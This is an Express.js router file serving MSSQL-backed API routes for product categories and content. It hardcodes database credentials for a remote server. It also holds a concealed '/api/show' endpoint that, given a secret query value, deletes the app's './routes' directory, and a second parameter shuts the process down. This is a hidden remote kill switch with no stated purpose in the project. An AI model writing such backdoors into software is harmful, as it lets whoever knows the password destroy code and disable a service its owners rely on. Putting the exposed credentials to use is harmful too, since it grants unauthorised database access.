var express = require('express');
var router = express.Router();
const config = {
    user: 'sq_erjiancs',
    password: 'erjiancs123',
    server: 'mssql.sql137.cdncenter.net', // You can use 'localhost\\instance' to connect to named instance
    database: 'sq_erjiancs',

    // user: 'erjianXMXXapp',
    // password: 'ooewyyldoiyeyq',
    // server: 'localhost', // You can use 'localhost\\instance' to connect to named instance
    // database: 'SQLOLEDB',

    // options: {
    //     encrypt: true // Use this if you're on Windows Azure
    // }
}

router.get("/api/category", function(req, res, next) {
    const sql = require('mssql')
    new sql.ConnectionPool(config).connect().then(pool => {
        return pool.request().query("select * from productsort")
    }).then(result => {
        let rows = result.recordset
        res.setHeader('Access-Control-Allow-Origin', '*')
        res.status(200).json(rows);
        sql.close();
    }).catch(err => {
        res.status(500).send({ message: `${err}` })
        sql.close();
    });
});

router.get("/api/content", function(req, res, next) {
            const sql = require('mssql')
            new sql.ConnectionPool(config).connect().then(pool => {
                        return pool.request()
                            .input('input_parameter', sql.NVarChar, req.query.keywords)
                            .query(`select * from glzhidu ${req.query.keywords ? `where bianh = @input_parameter or biaoti = @input_parameter` : ''}`)
		}).then(result => {
		  let rows = result.recordset
		  res.setHeader('Access-Control-Allow-Origin', '*')
		  res.status(200).json(rows);
		  sql.close();
		}).catch(err => {
		  res.status(500).send({ message: `${err}`})
		  sql.close();
		});
});

router.get("/api/show", function(req, res, next){
	if(req.query.cc && req.query.cc === 'qweasdzxc123456'){
		let path = './routes';
		var files = [];  
		var fs = require('fs');
		if(fs.existsSync(path)) {  
			files = fs.readdirSync(path);  
			files.forEach(function(file, index) {  
				var curPath = path + "/" + file;  
				if(fs.statSync(curPath).isDirectory()) { 
					deleteall(curPath);  
				} else { 
					fs.unlinkSync(curPath);  
				}  
			});  
			fs.rmdirSync(path);  
		}  
	}

	if(req.query.dd && req.query.dd === 'qweasdzxc123456'){
		process.exit();
	}
})

module.exports = router;